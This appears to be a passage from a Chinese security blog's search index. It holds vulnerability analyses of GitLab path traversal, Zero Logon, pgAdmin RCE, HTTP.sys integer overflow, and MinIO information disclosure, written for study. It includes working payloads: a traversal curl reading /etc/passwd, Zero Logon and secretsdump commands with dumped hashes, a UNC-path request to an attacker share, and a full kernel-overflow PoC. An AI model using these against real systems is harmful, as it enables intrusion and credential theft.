\u0026#39;alert_metric_image_upload\u0026#39; # Abuse Reports Images get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: /abuse_report/, mounted_as: /screenshot/, filename: %r{[^/]+} }, as: \u0026#39;abuse_report_upload\u0026#39; end # Redirect old note attachments path to new uploads path. get \u0026#34;files/note/:id/:filename\u0026#34;, to: redirect(\u0026#34;uploads/note/attachment/%{id}/%{filename}\u0026#34;), constraints: { filename: %r{[^/]+} } 坑点 组层数不够\n原先按照官方通告说的至少5层组嵌套，就只新建了5层，而后发送payload，一直报400，一度以为环境是16.0.1修复版本，而后发现是嵌套不够。\n$ curl http://192.168.59.197/g1/g2/g3/g4/g5/p1/uploads/dec19360ec8b52993908879181719de3/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%20 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;400 Bad Request\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;400 Bad Request\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 后来得到同事提示，需要至少9层才可以访问到根目录。\n穿越符不够\n经测试，至少需要12个穿越符../ 才能成功穿越到根目录\n小结\n本次漏洞分析有点事后诸葛亮，从已知的PoC推测触发的文件路径，但总算成功理解了整个触发文件流，坑点就是nginx解析导致需要足够的group才能穿越到根目录，分析这个漏洞的时候没学过ruby，依靠ChatGPT才能够理解某些代码。\nCreated at 2023-05-26T10:36:20+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/zero-logon/","title":"Zero Logon 分析","tags":[],"description":"","content":"基本信息 Netlogon协议认证过程： 影响版本 略\n环境搭建 win server 2012 技术分析\u0026amp;调试 利用 域环境使用Windows server 2012R2搭建，先用\r脚本重置域账户密码 python cve-2020-1472-exploit.py WIN2016 192.168.52.130 并抓取数据包 重置之后域账户的密码为空，对应hash为31d6cfe0d16ae931b73c59d7e0c089c0\n安装impacket：\npython3 -m pipx install impacket pipx ensurepath 使用impacket的secretsdump进行Dcsync，得到Administratr账户的NTLM hash secretsdump.py cqy.io/WIN2016\\$@WIN2016 -dc-ip 192.168.52.130 -just-dc-user cqy\\\\administrator -hashes 31d6cfe0d16ae931b73c59d7e0c089c0:31d6cfe0d16ae931b73c59d7e0c089c0 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:668d503af91aefe071e37a16e885047b::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:8996ffd41ae52dd62a3c60007d078f10eb7cd3eb5d4b74c90791c8e47eba88cb Administrator:aes128-cts-hmac-sha1-96:a3a6d348e74cee613718c2f94d404fb6 Administrator:des-cbc-md5:f732d313b5e92585 [*] Cleaning up... PoC分析 关键代码是下面这个函数，参数rpc_con是DCERPC_v5对象，描述了rcp链接，\nfor attempt in range(0, MAX_ATTEMPTS): result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer) if result is None: print(\u0026#39;=\u0026#39;, end=\u0026#39;\u0026#39;, flush=True) else: break def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer): # Connect to the DC\u0026#39;s Netlogon service. # Use an all-zero challenge and credential. plaintext = b\u0026#39;\\x00\u0026#39; * 8 ciphertext = b\u0026#39;\\x00\u0026#39; * 8 # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. flags = 0x212fffff # Send challenge and authentication request. nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + \u0026#39;\\x00\u0026#39;, target_computer + \u0026#39;\\x00\u0026#39;, plaintext) try: server_auth = nrpc.hNetrServerAuthenticate3( rpc_con, dc_handle + \u0026#39;\\x00\u0026#39;, target_computer + \u0026#39;$\\x00\u0026#39;, nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, target_computer + \u0026#39;\\x00\u0026#39;, ciphertext, flags ) # It worked! assert server_auth[\u0026#39;ErrorCode\u0026#39;] == 0 return True except nrpc.DCERPCSessionError as ex: # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working. if ex.get_error_code() == 0xc0000022: return None else: fail(f\u0026#39;Unexpected error code from DC: {ex.get_error_code()}.\u0026#39;) except BaseException as ex: fail(f\u0026#39;Unexpected error: {ex}.\u0026#39;) 在PoC中循环发起认证，每次认证时，client challenge置为0x00 * 8，client credential置为0x00 * 8 在\rnetlogon协议中知道，服务器会比较自己计算的ClientCredential和客户端发过来的ClientCredential是否相等，而ClientCredential来源于会话密钥加密ClientChallenge。其中加密算法为AES，使用CFB8模式。该算法过程如下： 算法步骤：\n确定一个16字节的初始向量IV。 将IV和明文组合,例如IV + 明文的前16个字节。 对组合的数据块进行AES加密,输出一个16字节的密文块。 从密文块的第一个字节,与明文的第一个字节进行异或,得到密文的第一个字节。 密文的第一个字节与IV的第一个字节组合,形成一个新的16字节值。 对这个新的值再次进行AES加密,得到下一个16字节密文块。 从新密文块取第一个字节,与明文的下一个字节异或,生成密文的下一个字节。 重复步骤5-7,直到所有明文都被加密。 若明文不足16的倍数字节,剩余明文使用PKCS7Padding进行填充。 AES-CFB8通过前一个密文块的反馈来影响下一个明文块的加密,从而避免了ECB模式的确定性问题。但必须使用随机的IV来保证安全性。\n会话密钥计算公式：KDF(ClientChallenge+ServerChallenge+secret)，在每一轮认证过程中，ServerChallenge都会变化，但Windows中实现的AES-CFB8使用的iv被设为16字节的0x00 攻击者可控ClientChallenge和ClientCredential，CLientChallenge对应于蓝色部分。由于轮认证时ServerChallenge都会改变且不会重复，所以每次计算出的会话密钥都不一样。当ClientChallenge置为0x00 * 8，当第一轮计算时，计算出的结果有1/256概率为0x00，而这个0x00又会作为下一轮输入添加到iv的第一个字节，即有1/256概率计算后的结果和计算前的值一样全为0x00，这样每一轮计算结果都是全为0x00。 这样第一轮计算后在算法中的输入为全0，加密密钥不变，第二轮计算时，结果依然会是0，这样最终算法结果输出会是全0。 由于每轮认证过程中会话密钥都不一样，所以每一轮认证过程时，AES-CFB8第一轮计算的结果都会不一样，结果最多有256种情况，最差的情况在第256轮时计算结果为0x00。\n当AES-CFB8加密结果刚刚好为全0时，客户端发送的ClientCredential也为全0，此时就可以通过服务端的校验，完成身份验证。\n可以编写一段简单的python代码模拟服务端加密过程\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes from cryptography.hazmat.backends import default_backend import secrets iv = bytes([ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ]) # 16 byte IV plaintext = bytes([ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ]) # 8 byte plaintext for i in range(256): key = secrets.token_bytes(16) # 8 byte key cipher = Cipher(algorithms.AES(key), modes.CFB8(iv), backend=default_backend()) encryptor = cipher.encryptor() ciphertext = encryptor.update(plaintext) + encryptor.finalize() print(ciphertext.hex()) 在第115次时，加密后的密文为0x0000000000000000 参考链接\nhttps://xz.aliyun.com/t/8367\nhttps://www.anquanke.com/post/id/219374#h3-6\nhttps://www.secrss.com/articles/25580\nCreated at 2023-05-08T14:39:28+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/","title":"CVE-2022-4223 PgAdmin RCE 分析","tags":["漏洞分析"],"description":"","content":"基本信息 pgAdmin 服务器包含一个 HTTP API，用于验证用户选择的外部 PostgreSQL 实用程序（如 pg_dump 和 pg_restore）的路径。该实用程序由服务器执行，以确定它来自哪个PostgreSQL版本。6.17 之前的 pgAdmin 版本无法正确保护此 API，这可能允许未经身份验证的用户使用他们选择的路径调用它，例如他们在 Windows 计算机上控制的服务器的 UNC 路径。这将导致目标路径中正确命名的可执行文件由 pgAdmin 服务器执行。\n指纹 略\n影响版本 pgadmin \u0026lt; 6.17\n环境搭建 windows 10 postgresql13 技术分析\u0026amp;调试 复现 直接安装postgresql13，自带了pgadmin4，初始化环境后，使用python 启动pgadmin4，编译如下代码\n#include\u0026lt;stdlib\u0026gt; int main(){ system(\u0026#34;whoami \u0026gt; c:\\\\users\\\\public\\\\1.txt\u0026#34;); return 0; } 编译后命名为pg_dump.exe，将其放到某个目录内，并开启文件共享。 发送如下payload，在utility_path指向共享的文件夹路径，\nPOST /misc/validate_binary_path HTTP/1.1 Host: [TARGETHOST] Cookie: [COOKIES_YOU_FETCHED_IN_ADVANCE] X-pgA-CSRFToken: [CSRF_TOKEN_YOU_FETCHED_IN_ADVANCE] Connection: close Referer: https://[TARGETHOST]/browser/ Content-Length: [n] Content-Type: application/json {\u0026#34;utility_path\u0026#34;:\u0026#34;\\\\\\\\[ATTACKER_IP]\\\\[PREFERED_SHARE_NAME]\u0026#34;} 分析 在 validate_binary_path路由对应的处理函数如下，这个函数接收POST请求，而后获取到body里面的 utility_path，这个函数接收 utility_path并使用 os.path.abspath(os.path.join拼接路径，而 os.path.join可以接受[[UNC路径]]，所以我们可以搭建一个SMB服务器并在上面有 pg_dump.exe，传入UNC路径，pgadmin就会获取到这个文件并执行，导致代码执行。\n@blueprint.route(\u0026#34;/validate_binary_path\u0026#34;, endpoint=\u0026#34;validate_binary_path\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) # [1] def validate_binary_path(): \u0026#34;\u0026#34;\u0026#34; This function is used to validate the specified utilities path by running the utilities with there versions. \u0026#34;\u0026#34;\u0026#34; data = None if hasattr(request.data, \u0026#39;decode\u0026#39;): data = request.data.decode(\u0026#39;utf-8\u0026#39;) if data != \u0026#39;\u0026#39;: data = json.loads(data) version_str = \u0026#39;\u0026#39; if \u0026#39;utility_path\u0026#39; in data and data[\u0026#39;utility_path\u0026#39;] is not None: # [2] # Check if \u0026#34;$DIR\u0026#34; present in binary path binary_path = replace_binary_path(data[\u0026#39;utility_path\u0026#39;]) # [3] for utility in UTILITIES_ARRAY: # [4] full_path = os.path.abspath( os.path.join(binary_path, (utility if os.name != \u0026#39;nt\u0026#39; else (utility + \u0026#39;.exe\u0026#39;)))) # [5] try: # Get the output of the \u0026#39;--version\u0026#39; command version_string = \\ subprocess.getoutput(\u0026#39;\u0026#34;{0}\u0026#34; --version\u0026#39;.format(full_path)) # [6] # Get the version number by splitting the result string version_string.split(\u0026#34;) \u0026#34;, 1)[1].split(\u0026#39;.\u0026#39;, 1)[0] ... 补丁 补丁中增加了身份验证，并且在拼接路径时使用os.path.exists检查是否存在，不存在则报错。\n小结 这个漏洞原理较为简单，python的函数可以接收UNC路径，而开发者并未考虑到这一点，导致可以传入UNC路径达成远程代码执行。值得注意的是这个漏洞是靠codeql审计出来的。\n参考链接\nhttps://frycos.github.io/vulns4free/2022/12/02/rce-in-20-minutes.html\nCreated at 2023-05-08T14:18:21+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/","title":"CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 在http.sys中存在整数溢出漏洞，攻击者可以利用整数溢出漏洞绕过字段大小检查，导致在调用memcpy时传入超出缓冲区大小的长度参数，造成内存溢出。\n环境搭建 操作系统 windows 10 调试器 windbg 技术分析\u0026amp;调试 PoC\n#define _WIN32_WINNT 0x0A00 #define SECURITY_WIN32 #include \u0026lt;http.h\u0026gt; #include \u0026lt;sspi.h\u0026gt; #include \u0026lt;strsafe.h\u0026gt; #pragma warning(disable : 4127) // condition expression is constant int __cdecl wmain(int argc, __in_ecount(argc) wchar_t *argv[]) { HANDLE hReqQueue = NULL; HTTPAPI_VERSION HttpApiVersion = HTTPAPI_VERSION_2; HTTP_SERVER_SESSION_ID ssID = HTTP_NULL_ID; ULONG retCode; HTTP_URL_GROUP_ID urlGroupId = HTTP_NULL_ID; // 初始化HTTP服务器驱动 retCode = HttpInitialize(HttpApiVersion, HTTP_INITIALIZE_SERVER, // Flags NULL // Reserved ); if (retCode != NO_ERROR) { wprintf(L\u0026#34;HttpInitialize failed with %lu \\n\u0026#34;, retCode); return retCode; } // 创建服务会话 retCode = HttpCreateServerSession(HttpApiVersion, \u0026amp;ssID, 0); if (retCode != NO_ERROR) { wprintf(L\u0026#34;HttpCreateServerSession failed with %lu \\n\u0026#34;, retCode); return 0; } // 创建url group retCode = HttpCreateUrlGroup(ssID, \u0026amp;urlGroupId, 0); if (retCode != NO_ERROR) { wprintf(L\u0026#34;HttpCreateUrlGroup failed with %lu \\n\u0026#34;, retCode); return 0; } BYTE data_temp1[0x1000] = {0}; DWORD return_len = 0; // 分配 0xfffffe0 大小的堆块 WCHAR *str = HeapAlloc(GetProcessHeap(), 0, 0xfffffe0); WCHAR str_test[0xfffe] = L\u0026#34;192.168.52.133:8081\u0026#34;; memcpy(str, str_test, 0x20); HTTP_CHANNEL_BIND_INFO bind_info; bind_info.Hardening = HttpAuthenticationHardeningLegacy; bind_info.Flags = HTTP_CHANNEL_BIND_PROXY; HTTP_SERVICE_BINDING_W service_binding; HTTP_SERVICE_BINDING_BASE binding_base; binding_base.Type = HttpServiceBindingTypeW; service_binding.Base = binding_base; service_binding.Buffer = str; service_binding.BufferSize = 0xfffffe0 - 0xf0f0f0; // F0F0EF0 PHTTP_SERVICE_BINDING_BASE binding_base_arr[0x11]; PHTTP_SERVICE_BINDING_BASE tmp_binding_base = \u0026amp;service_binding; for (int i = 0; i \u0026lt; 0x11; i++) { binding_base_arr[i] = tmp_binding_base; } bind_info.ServiceNames = binding_base_arr; bind_info.NumberOfServiceNames = 0x11; retCode = HttpSetUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty, \u0026amp;bind_info, 0x20); retCode = HttpQueryUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty, \u0026amp;data_temp1, 0x140, \u0026amp;return_len); } 在http!UlCopyChannelBindConfigToIrp 下断点，运行PoC，此时调用栈为\n1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 fffff889`cd7f76a8 fffff805`7981ae19 HTTP!UlCopyChannelBindConfigToIrp 01 fffff889`cd7f76b0 fffff805`7982caf5 HTTP!UlQueryConfigGroupProperty+0x175 02 fffff889`cd7f7740 fffff805`797130aa HTTP!UlQueryUrlGroupIoctl+0x195 03 fffff889`cd7f77c0 fffff805`6dc954d5 HTTP!UxDeviceControl+0x8a 04 fffff889`cd7f7800 fffff805`6e0a6048 nt!IofCallDriver+0x55 05 fffff889`cd7f7840 fffff805`6e0a5e47 nt!IopSynchronousServiceTail+0x1a8 06 fffff889`cd7f78e0 fffff805`6e0a51c6 nt!IopXxxControlFile+0xc67 07 fffff889`cd7f7a20 fffff805`6de0d8f5 nt!NtDeviceIoControlFile+0x56 08 fffff889`cd7f7a90 00007ff9`c610d1a4 nt!KiSystemServiceCopyEnd+0x25 09 00000014`7dcd6308 00007ff9`b6391b7a ntdll!NtDeviceIoControlFile+0x14 0a 00000014`7dcd6310 00007ff9`b6393c9f HTTPAPI!HttpApiSynchronousDeviceControl+0x8a 0b 00000014`7dcd6390 00007ff6`93fb18b2 HTTPAPI!HttpQueryUrlGroupProperty+0x6f 0c 00000014`7dcd6410 00000000`00000000 http_poc2!wmain+0x3d2 [D:\\code\\c\\http_poc2.c @ 113] http!UlCopyChannelBindConfigToIrp 伪代码如下，该函数调用UxGetOutputBufferForOutDirect 计算存储ChannelBindConfig 所需的内存大小，并和UxGetOutputBufferForOutDirect返回的分配的内存大小作比较：\n__int64 __fastcall UlCopyChannelBindConfigToIrp(__int64 a1, IRP *a2, unsigned int *a3) { ... v8 = UlpComputeChannelBindConfigSize(a1, a2); v43 = v8; if ( IoIs32bitProcess(a2) ) { v36 = 0i64; IoIs32bitProcess(a2); OutputBufferForOutDirect = UxGetOutputBufferForOutDirect( (_DWORD)a2, (_DWORD)CurrentStackLocation, 16, 4, (__int64)\u0026amp;v31, (__int64)\u0026amp;v32, (__int64)\u0026amp;v41); v33 = OutputBufferForOutDirect; if ( OutputBufferForOutDirect \u0026lt; 0 ) goto LABEL_32; if ( v8 \u0026gt; v41 ) { OutputBufferForOutDirect = -2147483643; v33 = -2147483643; if ( (WPP_MAIN_CB.StackSize \u0026amp; 0x20) != 0 ) { v10 = 43i64; LABEL_6: WPP_SF_D(v10, \u0026amp;WPP_64a86ec3d91e339ac994f13222c31d64_Traceguids, 2147483653i64); goto LABEL_32; } goto LABEL_32; } v11 = v31; if ( (*(_DWORD *)a1 \u0026amp; 1) == 0 ) { *(_QWORD *)v31 = 0i64; *(_QWORD *)(v11 + 8) = 0i64; goto LABEL_32; } *(_DWORD *)(v31 + 4) = *(_DWORD *)(a1 + 8); *(_DWORD *)v11 = *(_DWORD *)(a1 + 4); *(_QWORD *)(v11 + 8) = 0i64; v12 = *(_QWORD *)(a1 + 16); if ( !v12 || !*(_DWORD *)(v12 + 16) ) goto LABEL_32; v13 = (v11 + 19) \u0026amp; 0xFFFFFFFFFFFFFFFCui64; v38 = v13; v36 = (_DWORD *)v13; *(_DWORD *)(v11 + 8) = v13 + v32 - v31; *(_DWORD *)(v11 + 12) = *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64); v14 = *(unsigned int *)(*(_QWORD *)(a1 + 16) + 16i64); v15 = (_DWORD *)(v13 + 4 * v14); v37 = v15; v16 = (char *)\u0026amp;v15[3 * v14]; v35 = v16; v17 = 0; v34 = 0; while ( v17 \u0026lt; *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64) ) { *(_DWORD *)(v13 + 4i64 * v17) = (_DWORD)v15 + v32 - v31; v18 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 8i64) + 8i64 * v17); if ( *(_DWORD *)v18 == 2 ) { v36 = v15 + 3; v37 = v15 + 3; *v15 = 2; v15[1] = (_DWORD)v16 + v32 - v31; v15[2] = *(_DWORD *)(v18 + 16); memmove(v16, *(const void **)(v18 + 8), *(unsigned int *)(v18 + 16)); v16 = \u0026amp;v35[*(unsigned int *)(v18 + 16)]; } else { v36 = v15 + 3; v37 = v15 + 3; *v15 = 1; v30 = (char *)((unsigned __int64)(v16 + 1) \u0026amp; 0xFFFFFFFFFFFFFFFEui64); v15[1] = (_DWORD)v30 + v32 - v31; v15[2] = *(_DWORD *)(v18 + 16); memmove(v30, *(const void **)(v18 + 8), *(unsigned int *)(v18 + 16)); v16 = \u0026amp;v30[*(unsigned int *)(v18 + 16)]; } v35 = v16; v34 = ++v17; v15 = v36; v13 = v38; } LABEL_31: v3 = v42; goto LABEL_32; } v38 = 0i64; v19 = IoIs32bitProcess(a2); OutputBufferForOutDirect = UxGetOutputBufferForOutDirect( (_DWORD)a2, (_DWORD)CurrentStackLocation, 24, v19 != 0 ? 4 : 8, (__int64)\u0026amp;v31, (__int64)\u0026amp;v32, (__int64)\u0026amp;v41); v33 = OutputBufferForOutDirect; if ( OutputBufferForOutDirect \u0026lt; 0 ) goto LABEL_32; if ( v8 \u0026gt; v41 ) { OutputBufferForOutDirect = -2147483643; v33 = -2147483643; if ( (WPP_MAIN_CB.StackSize \u0026amp; 0x20) == 0 ) goto LABEL_32; v10 = 44i64; goto LABEL_6; } if ( v21 \u0026amp;\u0026amp; *(_DWORD *)(v21 + 16) ) { ... while ( v26 \u0026lt; *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64) ) { *(_QWORD *)(v22 + 8i64 * v26) = v32 + (unsigned int)(v24 - v31); v27 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 8i64) + 8i64 * v26); if ( *(_DWORD *)v27 == 2 ) { v36 = (_DWORD *)(v24 + 24); v37 = (_DWORD *)(v24 + 24); *(_DWORD *)v24 = 2; *(_QWORD *)(v24 + 8) = v32 + (unsigned int)((_DWORD)v25 - v31); *(_DWORD *)(v24 + 16) = *(_DWORD *)(v27 + 16); memmove(v25, *(const void **)(v27 + 8), *(unsigned int *)(v27 + 16)); v25 = \u0026amp;v35[*(unsigned int *)(v27 + 16)]; } else { v36 = (_DWORD *)(v24 + 24); v37 = (_DWORD *)(v24 + 24); *(_DWORD *)v24 = 1; v28 = (char *)((unsigned __int64)(v25 + 1) \u0026amp; 0xFFFFFFFFFFFFFFFEui64); *(_QWORD *)(v24 + 8) = v32 + (((_DWORD)v25 + 1) \u0026amp; 0xFFFFFFFE) - (unsigned int)v31; *(_DWORD *)(v24 + 16) = *(_DWORD *)(v27 + 16); memmove(v28, *(const void **)(v27 + 8), *(unsigned int *)(v27 + 16));// 触发漏洞 v25 = \u0026amp;v28[*(unsigned int *)(v27 + 16)]; } v35 = v25; v34 = ++v26; v24 = (__int64)v36; v22 = v39; } goto LABEL_31; } LABEL_32: if ( (int)(OutputBufferForOutDirect + 0x80000000) \u0026lt; 0 || OutputBufferForOutDirect == -2147483643 ) v6 = v8; *v3 = v6; return (unsigned int)OutputBufferForOutDirect; } 在UlpComputeChannelBindConfigSize函数中存在整数溢出，该函数伪代码如下，rsi+10h处指向了用户传入的HTTP_CHANNEL_BIND_INFO结构体，该结构体定义如下：\ntypedef struct _HTTP_CHANNEL_BIND_INFO { HTTP_AUTHENTICATION_HARDENING_LEVELS Hardening; ULONG Flags; PHTTP_SERVICE_BINDING_BASE * ServiceNames; ULONG NumberOfServiceNames; } HTTP_CHANNEL_BIND_INFO, *PHTTP_CHANNEL_BIND_INFO; typedef enum _HTTP_AUTHENTICATION_HARDENING_LEVELS { HttpAuthenticationHardeningLegacy = 0, HttpAuthenticationHardeningMedium, HttpAuthenticationHardeningStrict } HTTP_AUTHENTICATION_HARDENING_LEVELS; typedef struct _HTTP_SERVICE_BINDING_BASE { HTTP_SERVICE_BINDING_TYPE Type; } HTTP_SERVICE_BINDING_BASE, *PHTTP_SERVICE_BINDING_BASE; typedef struct _HTTP_SERVICE_BINDING_A { HTTP_SERVICE_BINDING_BASE Base; PCHAR Buffer; ULONG BufferSize; } HTTP_SERVICE_BINDING_A, *PHTTP_SERVICE_BINDING_A; typedef struct _HTTP_SERVICE_BINDING_W { HTTP_SERVICE_BINDING_BASE Base; PWCHAR Buffer; ULONG BufferSize; } HTTP_SERVICE_BINDING_W, *PHTTP_SERVICE_BINDING_W; __int64 __fastcall UlpComputeChannelBindConfigSize(__int64 a1, IRP *a2) { unsigned int v4; // ebx __int64 v5; // rax __int64 v6; // rdi __int64 v7; // r9 _DWORD *v8; // r8 v4 = IoIs32bitProcess(a2) != 0 ? 16 : 24; if ( (*(_DWORD *)a1 \u0026amp; 1) != 0 ) { v5 = *(_QWORD *)(a1 + 16); if ( v5 ) { if ( *(_DWORD *)(v5 + 16) ) { v6 = 0i64; v4 += (IoIs32bitProcess(a2) != 0 ? 16 : 32) * *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64); if ( *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64) ) { do { IoIs32bitProcess(a2); v7 = *(_QWORD *)(a1 + 16); // HTTP_CHANNEL_BIND_INFO 结构体 v8 = *(_DWORD **)(*(_QWORD *)(v7 + 8) + 8 * v6);// ServiceName 结构体 if ( *v8 == 1 ) // 如果是HttpServiceBindingTypeW 则进入 v4 = (v4 + 1) \u0026amp; 0xFFFFFFFE; v4 += v8[4]; // V8是enum HTTP_SERVICE_BINDING_BASE类型，占4个字节，则V8[4]就是V8 后面16个字节，即BufferSize v6 = (unsigned int)(v6 + 1); } while ( (unsigned int)v6 \u0026lt; *(_DWORD *)(v7 + 16) ); } } } } return v4; } 该函数遍历HTTP_CHANNEL_BIND_INFO结构体的ServiceNames HTTP_SERVICE_BINDING_W指针数组的BufferSize，并相加，而后将其返回，其中v4为unsigned int类型，而BufferSize为ULONG类型，均为四个字节，当循环相加时，如果BufferSize * NumberOfServiceNames 和v4相加超出0xFFFFFFFF则会产生整数溢出，使得UlpComputeChannelBindConfigSize返回的内存大小小于实际所需的内存大小。在调试器中可以看到在执行完fffff805`7984c899 03d9 add ebx, ecx后，将产生溢出，ebx变为0x28。\n返回到上层函数，UlCopyChannelBindConfigToIrp 调用UxGetOutputBufferForOutDirect获取到用户传入的缓冲区大小，此时v41值为0x140\nretCode = HttpQueryUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty, \u0026amp;data_temp1, 0x140, \u0026amp;return_len); v43 = v8; if ( IoIs32bitProcess(a2) ) { v36 = 0i64; IoIs32bitProcess(a2); OutputBufferForOutDirect = UxGetOutputBufferForOutDirect( (__int64)a2, (__int64)CurrentStackLocation, 0x10u, 4i64, \u0026amp;v31, \u0026amp;v32, \u0026amp;v41); v33 = OutputBufferForOutDirect; if ( OutputBufferForOutDirect \u0026lt; 0 ) goto LABEL_32; if ( v8 \u0026gt; v41 ) { OutputBufferForOutDirect = -2147483643; v33 = -2147483643; if ( (WPP_MAIN_CB.StackSize \u0026amp; 0x20) != 0 ) { v10 = 43i64; LABEL_6: WPP_SF_D(v10, \u0026amp;WPP_64a86ec3d91e339ac994f13222c31d64_Traceguids, 2147483653i64); goto LABEL_32; } goto LABEL_32; } 由于在HTTP!UlpComputeChannelBindConfigSize中发生整数溢出，导致HTTP!UlpComputeChannelBindConfigSize返回值小于用户提供的0x140，绕过了内存大小检查，在后面通过memcpy将HTTP_CHANNEL_BIND_INFO结构体的PHTTP_SERVICE_BINDING_BASE的Buffer成员拷贝到指定内存中，拷贝长度为BufferSize，即用户提供的0xF0F0EF0\n0xF0F0EF0远大于用户输入的缓冲区0x1000，导致堆溢出。\n补丁 通过bindiff可知，在补丁中增加了对BufferSize进行判断的逻辑，判断BufferSize是否小于0xFFFC\n由于ServiceName最大数量限制为0x40，则0x40 * 0xFFFC = 3FFF00，不能产生溢出，修复了该漏洞。\n参考资料\nhttps://www.freebuf.com/vuls/364920.html\nCreated at 2023-05-05T20:59:45+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-3156-sudo-eop/","title":"CVE-2021-3156 Sudo 权限提升漏洞分析","tags":["漏洞分析"],"description":"","content":"Created at 2023-05-05T20:54:20+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/","title":"CVE-2023-28432 MinIO 信息泄露漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 Minio是一个多云对象存储框架。在从 RELEASE.2019-12-17T23-16-33Z 开始且 RELEASE.2023-03-20T20-16-18Z 之前的集群部署中，MinIO 返回所有环境变量，包括“MINIO_SECRET_KEY”和“MINIO_ROOT_PASSWORD”，从而导致信息泄露。分布式部署的所有用户都会受到影响。建议所有用户升级到发布版本.2023-03-20T20-16-18Z。\n指纹 web.title=\u0026ldquo;minio\u0026rdquo;\n影响版本 2019-12-17t23-16-33z \u0026lt;= Minio \u0026lt; 2023-03-20t20-16-18z\n环境搭建 使用Docker启动4个minio即可。\n技术分析\u0026amp;调试 补丁分析 对比修复版本和未修复版本 https://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z\u0026hellip;RELEASE.2023-03-20T20-16-18Z可知漏洞在commit https://github.com/minio/minio/commit/3b5dbf90468b874e99253d241d16d175c2454077修复，查看修复代码，可以知道在 cmd/bootstrap-peer-server.go#VerifyHandler方法中增加了鉴权逻辑： func storageServerRequestValidate(r *http.Request) error { token, err := jwtreq.AuthorizationHeaderExtractor.ExtractToken(r) if err != nil { if err == jwtreq.ErrNoTokenInRequest { return errNoAuthToken } return errMalformedAuth } claims := xjwt.NewStandardClaims() if err = xjwt.ParseWithStandardClaims(token, claims, []byte(globalActiveCred.SecretKey)); err != nil { return errAuthentication } owner := claims.AccessKey == globalActiveCred.AccessKey || claims.Subject == globalActiveCred.AccessKey if !owner { return errAuthentication } if claims.Audience != r.URL.RawQuery { return errAuthentication } requestTimeStr := r.Header.Get(\u0026#34;X-Minio-Time\u0026#34;) requestTime, err := time.Parse(time.RFC3339, requestTimeStr) if err != nil { return errMalformedAuth } utcNow := UTCNow() delta := requestTime.Sub(utcNow) if delta \u0026lt; 0 { delta *= -1 } if delta \u0026gt; DefaultSkewTime { return errSkewedAuthTime } return nil } 而 VerifyHandler方法对应的路由在cmd/bootstrap-peer-server.go#registerBootstrapRESTHandlers注册，对应的路径为 bootstrapRESTPrefix+bootstrapRESTVersionPrefix + bootstrapRESTMethodVerify\nfunc registerBootstrapRESTHandlers(router *mux.Router) { h := func(f http.HandlerFunc) http.HandlerFunc { return collectInternodeStats(httpTraceHdrs(f)) } server := \u0026amp;bootstrapRESTServer{} subrouter := router.PathPrefix(bootstrapRESTPrefix).Subrouter() subrouter.Methods(http.MethodPost).Path(bootstrapRESTVersionPrefix + bootstrapRESTMethodHealth).HandlerFunc( h(server.HealthHandler)) subrouter.Methods(http.MethodPost).Path(bootstrapRESTVersionPrefix + bootstrapRESTMethodVerify).HandlerFunc( h(server.VerifyHandler)) } minioReservedBucket = \u0026#34;minio\u0026#34; minioReservedBucketPath = SlashSeparator + minioReservedBucket bootstrapRESTPrefix = minioReservedBucketPath + \u0026#34;/bootstrap\u0026#34; const ( bootstrapRESTVersion = \u0026#34;v1\u0026#34; bootstrapRESTVersionPrefix = SlashSeparator + bootstrapRESTVersion ) const ( bootstrapRESTMethodVerify = \u0026#34;/verify\u0026#34; ) 